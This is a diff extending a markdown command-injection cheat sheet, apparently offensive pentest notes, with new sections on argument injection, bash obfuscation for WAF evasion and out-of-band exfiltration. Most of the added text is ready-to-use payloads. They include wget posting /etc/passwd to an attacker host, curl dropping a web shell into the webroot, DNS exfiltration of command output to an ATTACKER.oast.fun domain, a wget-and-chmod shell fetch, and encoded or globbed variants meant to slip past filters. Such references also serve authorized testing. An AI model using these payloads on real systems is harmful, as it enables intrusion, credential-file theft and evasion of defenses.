@@ -412,12 +412,98 @@ input.jpg; wget http://ATTACKER_IP/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shel
 
 ---
 
+## Argument / Option Injection
+
+Even without a shell metacharacter, you can inject **extra CLI flags** into a trusted binary to gain file write/read or RCE:
+
+```bash
+# curl: write attacker-controlled output to a file (-o) or read local (file://)
+filename=" -o /var/www/html/shell.php https://attacker/shell.txt"
+url="file:///etc/passwd"
+# tar: --checkpoint-action / wildcard injection
+*  --checkpoint=1  --checkpoint-action=exec=sh\ shell.sh
+# wget: --output-document / --post-file exfil
+" --post-file=/etc/passwd http://attacker/"
+# git: -c core.sshCommand / ext:: / upload-pack injection
+"ext::sh -c 'id'"   "-u./payload"
+# ffmpeg / convert / zip / rsync (-e) — many GTFOBins-style flags
+# find: -exec
+" -exec sh -c id \;"
+```
+
+> Check **GTFOBins** for the binary in scope — many "safe" tools have a flag that yields read/write/exec.
+
+---
+
+## Advanced Linux Bash Obfuscation (WAF/keyword evasion)
+
+```bash
+# Brace / glob expansion (no spaces, no literal cmd name)
+{cat,/etc/passwd}
+/???/c?t /???/p??swd
+/bin/c\at /e?c/p?sswd
+$(rev<<<'di')              # -> id   (reverse)
+$(printf '\151\144')       # -> id   (octal)
+$(tr '[A-Z]' '[a-z]'<<<'ID')
+c$@at /etc/pa$@sswd        # $@ expands to nothing
+who$()ami     w\ho\am\i    'wh'o'am'i    "wh"o"am"i
+$(echo aWQ=|base64 -d)     # -> id
+$IFS / ${IFS} / $'\t' / <space-alternatives>
+cat${IFS}/etc/passwd       cat$IFS$9/etc/passwd
+# Newline / CRLF injection (when only one arg allowed)
+%0a id     %0d%0a id
+# Bash arithmetic / parameter expansion to build strings
+x=cat;y=/etc/passwd;$x $y
+echo ${PATH:0:1}           # -> /  (build paths from env)
+```
+
+---
+
+## Blind / Out-of-Band (deep)
+
+```bash
+# DNS exfil one char/chunk at a time (no egress HTTP needed)
+nslookup $(whoami).ATTACKER.oast.fun
+nslookup `id|base64|tr -d '=+/'|head -c60`.ATTACKER.oast.fun
+host $(cat /etc/passwd|head -1|base64).ATTACKER.oast.fun
+
+# Time-based boolean oracle (no output, no OOB)
+if [ $(whoami|cut -c1) = r ]; then sleep 5; fi
+$(if id|grep -q root;then sleep 5;fi)
+
+# Force output to a web-readable file then fetch it
+id > /var/www/html/out.txt ; curl http://TARGET/out.txt
+```
+
+Use **interactsh** / Burp Collaborator for the OOB channel; DNS works even when HTTP egress is firewalled.
+
+---
+
 ## Tools
 
 | Tool | Use Case |
 |------|----------|
-| Burp Suite | Intercept and modify requests |
+| Burp Suite (+ Collaborator) | Intercept/modify; OOB blind confirmation |
+| **commix** | Automated command-injection detection & exploitation |
+| **GTFOBins** | Find argument-injection / privilege primitives per binary |
 | curl | Manual command injection testing |
 | Netcat | Reverse shell listeners |
-| PowerShell | Windows command execution and payloads |
-| Powercat | PowerShell reverse shell utility |
+| PowerShell / Powercat | Windows command execution and reverse shells |
+
+```bash
+# commix
+commix -u "http://TARGET/page?ip=127.0.0.1" --level=3
+commix -r request.txt --os-shell
+```
+
+---
+
+## References
+
+- PortSwigger — OS command injection: https://portswigger.net/web-security/os-command-injection
+- PayloadsAllTheThings — Command Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/Command%20Injection/
+- PayloadsAllTheThings — Argument Injection: https://swisskyrepo.github.io/PayloadsAllTheThings/Argument%20Injection/
+- HackTricks — Command injection: https://hacktricks.wiki/en/pentesting-web/command-injection.html
+- GTFOBins: https://gtfobins.github.io/
+- OWASP Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
+- commix: https://github.com/commixproject/commix
